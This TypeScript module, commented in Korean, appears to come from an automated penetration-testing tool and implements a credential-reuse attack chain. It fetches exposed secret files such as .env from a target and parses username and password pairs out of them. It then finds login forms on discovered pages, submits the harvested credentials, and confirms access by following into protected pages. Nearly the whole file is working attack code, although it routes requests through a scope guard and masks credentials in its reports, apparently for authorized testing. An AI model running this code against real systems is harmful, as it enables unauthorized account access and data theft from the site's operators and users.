/**
 * 다단계 체이닝 — 검증된 노출을 다음 공격 단계에 재사용한다(웹 취약점 → 실제 확대).
 *
 * 현재 구현한 체인: **자격증명 재사용(credential reuse)**.
 *   1) 노출된 비밀 파일(.env 등)에서 KEY=VALUE 자격증명 쌍을 파싱(원문 fetch).
 *   2) 정찰이 발견한 페이지에서 로그인 폼(<input type=password>)을 탐지.
 *   3) 각 폼에 재사용 크리덴셜로 POST → 302+Set-Cookie 또는 인증 성공 응답 확인.
 *   4) 성공 시 보호자원을 실제로 fetch 하고, 검증된 체인 증거 + finding 으로 보고한다.
 *
 * 원칙: 모든 요청은 ToolContext(ScopeGuard/RPS/프록시) 경유. 실패는 조용히 스킵
 * (오탐 방지 — "인증됐다고 추정"하지 않고 응답으로만 판정). 리포트에는 마스킹만 반영.
 */

import type { EngagementFinding, ToolContext } from "../core/types.js";
import { newJar } from "../net/http-client.js";
import { authGet, authPost, baseUrl, joinPath } from "../tools/util.js";
import { redactSample } from "./evidence.js";
import type { EvidenceItem, ToolOutcome } from "./types.js";

export interface ChainOptions {
  /** 원문 fetch cap(자격증명 파싱용). 기본 4000. */
  secretCap?: number;
  /** 로그인 폼 후보 페이지 수 상한. 기본 12. */
  maxPages?: number;
  /** 시도할 자격증명 쌍 수 상한. 기본 8. */
  maxPairs?: number;
}

export interface CredPair {
  user: string;
  pass: string;
  /** 출처(비밀 파일 경로). */
  via: string;
}

export interface LoginForm {
  /** 폼의 절대 URL. */
  url: string;
  action: string;
  method: "get" | "post";
  /** 폼에 포함된 모든 필드(name→value; hidden 포함). */
  fields: Array<{ name: string; value?: string }>;
  userField: string;
  passField: string;
}

export interface ChainResult {
  items: EvidenceItem[];
  findings: EngagementFinding[];
  attempts: number;
}

const USER_KEY = /(user|login|account|email|admin|id)/i;
const PASS_KEY = /(pass|secret|key|token|pwd)/i;
const PAIR_JOINTS: Array<[RegExp, RegExp]> = [
  [/^(db_)?(user|username)$/i, /^(db_)?(pass|password)$/i],
  [/^admin(user|_user|_login)?$/i, /^admin(pass|_pass|_password|_secret)$/i],
  [/^app_(user|username)$/i, /^app_(pass|password)$/i],
  [/^mysql_(user|username)$/i, /^mysql_(pass|password)$/i],
  [/^postgres_(user|username)$/i, /^postgres_(pass|password)$/i],
  [/user/i, /pass/i],
];

/** KEY=VALUE / KEY: value 행을 파싱해 환경변수 맵을 만든다. */
export function parseEnv(raw: string): Map<string, string> {
  const out = new Map<string, string>();
  for (const line of raw.split(/\r?\n/)) {
    const m = /^([A-Za-z_][A-Za-z0-9_]*)\s*[:=]\s*(.+?)\s*$/.exec(line);
    if (!m) continue;
    const v = m[2].replace(/^["']|["']$/g, "");
    if (v && v !== "***") out.set(m[1], v);
  }
  return out;
}

/** env 맵 → 로그인 시도용 자격증명 쌍(우선순위: 명시적 조인 → user/pass 교차). */
export function credPairsFromEnv(env: Map<string, string>, via: string): CredPair[] {
  const pairs: CredPair[] = [];
  const seen = new Set<string>();
  const pushPair = (u: string, p: string) => {
    const k = u + "\u0000" + p;
    if (seen.has(k)) return;
    seen.add(k);
    pairs.push({ user: u, pass: p, via });
  };
  for (const [uRe, pRe] of PAIR_JOINTS) {
    for (const [uk, uv] of env) {
      if (!uRe.test(uk)) continue;
      for (const [pk, pv] of env) {
        if (pk === uk || !pRe.test(pk)) continue;
        pushPair(uv, pv);
      }
      if (pairs.length >= 8) return pairs;
    }
  }
  // 폴백: 이름상 user/pass 로 보이는 키 하나씩 교차(같은 키 제외).
  const users = [...env].filter(([k]) => USER_KEY.test(k));
  const passes = [...env].filter(([k]) => PASS_KEY.test(k));
  for (const [uk, uv] of users) {
    for (const [pk, pv] of passes) {
      if (uk === pk) continue;
      pushPair(uv, pv);
      if (pairs.length >= 8) return pairs;
    }
  }
  return pairs;
}

const HTML_SKIP = /\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|map|json|xml|pdf|zip|gz|tar|sql|log|bak|old|env)$/i;

/** 발견된 표면(fingerprint 지표 + 시드)에서 로그인 폼 후보 페이지 URL 을 모은다. */
export function candidateUrls(outcomes: ToolOutcome[], base: string, seedPath = "/"): string[] {
  const out: string[] = [];
  const push = (p: string) => {
    const u = joinPath(base, p.startsWith("/") ? p : "/" + p);
    if (!out.includes(u)) out.push(u);
  };
  push(seedPath);
  for (const o of outcomes) {
    for (const s of o.fp?.indicators ?? []) {
      const m = /^endpoint (\S+)/.exec(s) ?? /^(?:exposed|path)\s+(\S+)/.exec(s);
      if (m && !HTML_SKIP.test(m[1])) push(m[1]);
    }
  }
  return out.slice(0, 12);
}

const ATTR = /([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))/g;

function attr(name: string, tag: string): string | undefined {
  for (const m of tag.matchAll(ATTR)) {
    if (m[1].toLowerCase() === name) return m[2] ?? m[3] ?? m[4] ?? "";
  }
  return undefined;
}

/** HTML 문자열에서 로그인 폼을 찾는다. 패스워드 입력이 있는 폼만 반환. */
export function findLoginForms(html: string, pageUrl: string): LoginForm[] {
  const forms: LoginForm[] = [];
  const re = /<form\b[^>]*>([\s\S]*?)<\/form\s*>/gi;
  for (const m of html.matchAll(re)) {
    const tag = m[0];
    const inner = m[1];
    const action = attr("action", tag) ?? pageUrl;
    const method = (attr("method", tag) ?? "get").toLowerCase() === "post" ? "post" : "get";
    const fields: Array<{ name: string; value?: string }> = [];
    let passField = "";
    let userField = "";
    for (const im of inner.matchAll(/<(input|select|textarea)\b[^>]*>/gi)) {
      const itag = im[0];
      const name = attr("name", itag);
      if (!name) continue;
      const type = (attr("type", itag) ?? "text").toLowerCase();
      const val = attr("value", itag) ?? (im[1] === "textarea" ? />([\s\S]*?)<\/textarea/i.exec(itag)?.[1] : undefined);
      fields.push({ name, value: val });
      if (type === "password" && !passField) passField = name;
      else if (!userField && (type === "text" || type === "email") && (USER_KEY.test(name) || fields.length === 1)) userField = name;
    }
    if (passField && !userField) userField = fields.find((f) => f.name !== passField)?.name ?? "";
    if (passField && userField) {
      forms.push({ url: resolveUrl(pageUrl, action), action, method, fields, userField, passField });
    }
  }
  return forms;
}

function resolveUrl(pageUrl: string, action: string): string {
  try {
    return new URL(action, pageUrl).href;
  } catch {
    return pageUrl;
  }
}

const PROTECTED_HINT = /(logout|dashboard|admin|panel|계정|관리자|welcome|profile)/i;

/**
 * 폼에 크리덴셜 POST → 인증 성공 판정(응답으로만 판정).
 * 성공: (302/303 + Location 이 login 화면 아님) 또는 (200 + Set-Cookie + 패스워드 입력이 사라짐).
 */
export async function tryLogin(
  ctx: ToolContext,
  form: LoginForm,
  cred: CredPair,
): Promise<{ finalUrl: string; proof: string } | null> {
  const jar = newJar();
  // authPost 는 ctx.jar 를 사용하므로 시도별 jar 를 ctx 에 주입한다(세션 실증용).
  const ctxJ: ToolContext = { ...ctx, jar };
  const body = form.fields
    .map((f) => {
      let v = f.value ?? "";
      if (f.name === form.userField) v = cred.user;
      else if (f.name === form.passField) v = cred.pass;
      return `${encodeURIComponent(f.name)}=${encodeURIComponent(v)}`;
    })
    .join("&");
  const url = resolveUrl(form.url, form.action);
  let res;
  try {
    res = await authPost(ctxJ, url, body, {
      contentType: "application/x-www-form-urlencoded",
      cap: 6000,
    });
  } catch {
    return null;
  }
  const loc = (res.headers["location"] ?? res.headers["Location"] ?? "").toLowerCase();
  if (res.status === 302 || res.status === 303 || res.status === 301) {
    if (!loc || /(login|signin|auth)/.test(loc)) return null;
  } else if (res.status === 200) {
    const hasCookie = Object.keys(res.headers).some((k) => k.toLowerCase() === "set-cookie");
    if (!hasCookie || /type=["']?password/i.test(res.body)) return null;
  } else {
    return null;
  }
  // 보호자원 실제 접근(쿠키 유지) — 체인 증명.
  const followUrl = loc ? resolveUrl(url, res.headers["location"] ?? res.headers["Location"] ?? "/") : url;
  let finalUrl = url;
  let sample = res.body.slice(0, 300);
  if (followUrl !== url) {
    const f2 = await authGet(ctxJ, followUrl, { cap: 1500 });
    finalUrl = followUrl;
    sample = `${res.status} → ${f2.status} ${f2.body.slice(0, 280)}`;
  }
  if (!PROTECTED_HINT.test(sample)) return null;
  return { finalUrl, proof: sample };
}

/** 체인 실행: 노출 비밀 → 로그인 폼 스캔 → 자격증명 재사용 시도. */
export async function runChain(
  ctx: ToolContext,
  outcomes: ToolOutcome[],
  opts: ChainOptions = {},
): Promise<ChainResult> {
  const base = baseUrl(ctx.target);
  const secretCap = opts.secretCap ?? 4000;
  const maxPages = opts.maxPages ?? 12;
  const maxPairs = opts.maxPairs ?? 8;

  // 1) 노출된 비밀 파일 원문 fetch → 자격증명 쌍.
  const pairs: CredPair[] = [];
  const seenPairs = new Set<string>();
  const secretPaths = new Set<string>();
  for (const o of outcomes) {
    for (const s of o.fp?.indicators ?? []) {
      const m = /^(?:exposed|path)\s+(\S+)/.exec(s);
      if (m) {
        const p = m[1].startsWith("/") ? m[1] : "/" + m[1];
        secretPaths.add(p);
      }
    }
  }
  for (const p of secretPaths) {
    let raw = "";
    try {
      const r = await authGet(ctx, joinPath(base, p), { cap: secretCap });
      raw = r.body ?? "";
    } catch {
      continue;
    }
    const env = parseEnv(raw);
    for (const cp of credPairsFromEnv(env, p)) {
      const k = `${cp.user}\u0000${cp.pass}`;
      if (!seenPairs.has(k)) {
        seenPairs.add(k);
        pairs.push(cp);
      }
      if (pairs.length >= maxPairs) break;
    }
    if (pairs.length >= maxPairs) break;
  }
  if (pairs.length === 0) return { items: [], findings: [], attempts: 0 };

  // 2) 로그인 폼 후보 페이지 스캔.
  const formTargets = candidateUrls(outcomes, base).slice(0, maxPages);
  const forms: LoginForm[] = [];
  for (const u of formTargets) {
    let html = "";
    try {
      const r = await authGet(ctx, u, { cap: 16000 });
      html = r.body ?? "";
    } catch {
      continue;
    }
    for (const f of findLoginForms(html, u)) forms.push(f);
    if (forms.length >= 4) break;
  }
  if (forms.length === 0) return { items: [], findings: [], attempts: 0 };

  // 3) 폼 × 크리덴셜 시도.
  const items: EvidenceItem[] = [];
  const findings: EngagementFinding[] = [];
  let attempts = 0;
  for (const form of forms) {
    for (const cred of pairs) {
      attempts++;
      const ok = await tryLogin(ctx, form, cred);
      if (!ok) continue;
      // 증거 문자열에 자격증명 원문이 남지 않게 값 단위로 먼저 마스킹.
      const credLine = `${form.userField}=${cred.user} / ${form.passField}=${cred.pass}`;
      const credLineSafe = credLine.split(cred.user).join("***").split(cred.pass).join("***");
      const proofRedacted = redactSample(
        `[체이닝] 자격증명 재사용 인증 성공 — ${credLineSafe} (출처 ${cred.via}) → ${ok.finalUrl} 응답: ${ok.proof}`,
      );
      const id = `chain-${items.length + 1}`;
      items.push({
        id,
        category: "endpoint",
        label: `자격증명 재사용 로그인 성공 → 보호자원 접근 (${form.url})`,
        source: "chain",
        target: ok.finalUrl,
        severity: "high",
        sample: proofRedacted.slice(0, 1500),
        redacted: true,
        itemCount: 1,
        attack:
          `노출된 ${cred.via} 에서 얻은 자격증명이 ${form.url} 로그인에 재사용됨 — ` +
          "공격자가 비밀 파일 하나로 보호자원 전체에 접근할 수 있다(수평·수직 확대의 시작점).",
        verification: { status: "verified", proof: proofRedacted.slice(0, 1500) },
      });
      findings.push({
        phase: "exploit",
        severity: "high",
        title: "자격증명 재사용으로 보호자원 접근 (체이닝)",
        detail:
          `${cred.via} 노출 자격증명으로 ${form.url} 로그인 성공, 보호자원 ${ok.finalUrl} 접근 확인. ` +
          "출처 확인: 검증된 착취(체인 증거 attached).",
        evidence: `chained evidence ${id}: ${proofRedacted.slice(0, 300)}`,
      });
      return { items, findings, attempts };
    }
  }
  return { items, findings, attempts };
}
